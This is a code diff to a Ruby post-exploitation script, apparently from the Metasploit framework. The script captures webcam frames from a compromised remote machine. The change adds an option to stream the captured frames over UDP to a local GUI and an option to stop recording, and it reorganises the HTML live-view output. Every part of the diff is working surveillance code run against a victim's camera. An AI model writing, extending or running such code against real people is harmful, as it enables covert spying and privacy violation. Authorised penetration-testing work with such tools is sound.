@@ -13,7 +13,9 @@ opts = Rex::Parser::Arguments.new(
 	"-d" => [ true, "Loop delay interval (in ms, default 1000)" ],
 	"-i" => [ true, "The index of the webcam to use (Default: 1)" ],
 	"-q" => [ true, "The JPEG image quality (Default: 50)" ],
-	"-p" => [ true, "The path to the folder images will be saved in (Default: current working directory)" ]
+	"-g" => [ false, "Send to GUI instead of writing to file" ],
+	"-s" => [ true, "Stop recording" ],
+	"-p" => [ true, "The path to the folder images will be saved in (Default: current working directory)"]
 )
 
 folderpath = "."
@@ -21,6 +23,7 @@ single = false
 quality = 50
 index = 1
 interval = 1000
+gui = false
 opts.parse(args) { |opt, idx, val|
 	case opt
 	when "-h"
@@ -37,8 +40,14 @@ opts.parse(args) { |opt, idx, val|
 		index = val.to_i
 	when "-q"
 		quality = val.to_i
+	when "-g"
+		gui = true
 	when "-p"
 		folderpath = val
+	when "-s"
+		print_line("[*] Stopping webcam")
+		client.webcam.webcam_stop
+		raise Rex::Script::Completed
 	end
 }
 
@@ -57,12 +66,22 @@ begin
 	end
 	print_line("[*] Starting webcam #{index}: #{camlist[index - 1]}")
 	client.webcam.webcam_start(index)
+	
+	#prepare output
+	if(gui)
+		sock = Rex::Socket::Udp.create(
+				'PeerHost' => "127.0.0.1",
+				'PeerPort' => 16235
+			)
+	end
 	imagepath = folderpath + ::File::SEPARATOR + "webcam.jpg"
 	htmlpath = folderpath + ::File::SEPARATOR + "webcam.htm"
 	begin
 		if single == true
 			data = client.webcam.webcam_get_frame(quality)
-			if( data )
+			if(gui)
+				sock.write(data)
+			else
 				::File.open( imagepath, 'wb' ) do |fd|
 					fd.write( data )
 				end
@@ -71,16 +90,20 @@ begin
 				Rex::Compat.open_file( path )
 			end
 		else
-			::File.open(htmlpath, 'wb' ) do |fd|
-				fd.write('<html><body><img src="webcam.jpg"></img><script>'+
-					"setInterval('location.reload()',#{interval});</script></body><html>" )
+			if(!gui)
+				::File.open(htmlpath, 'wb' ) do |fd|
+					fd.write('<html><body><img src="webcam.jpg"></img><script>'+
+						"setInterval('location.reload()',#{interval});</script></body><html>" )
+				end
+				print_line( "[*] View live stream at: #{htmlpath}" )
+				Rex::Compat.open_file(htmlpath)
+				print_line( "[*] Image saved to : #{imagepath}" )
 			end
-			print_line( "[*] View live stream at: #{htmlpath}" )
-			Rex::Compat.open_file(htmlpath)
-			print_line( "[*] Image saved to : #{imagepath}" )
 			while true do
 				data = client.webcam.webcam_get_frame(quality)
-				if( data )
+				if(gui)
+					sock.write(data)
+				else
 					::File.open( imagepath, 'wb' ) do |fd|
 						fd.write( data )
 					end
@@ -94,6 +117,7 @@ begin
 	end
 	print_line("[*] Stopping webcam")
 	client.webcam.webcam_stop
+	sock.close
 rescue ::Exception => e
 	print_error("Error: #{e.class} #{e} #{e.backtrace}")
 end
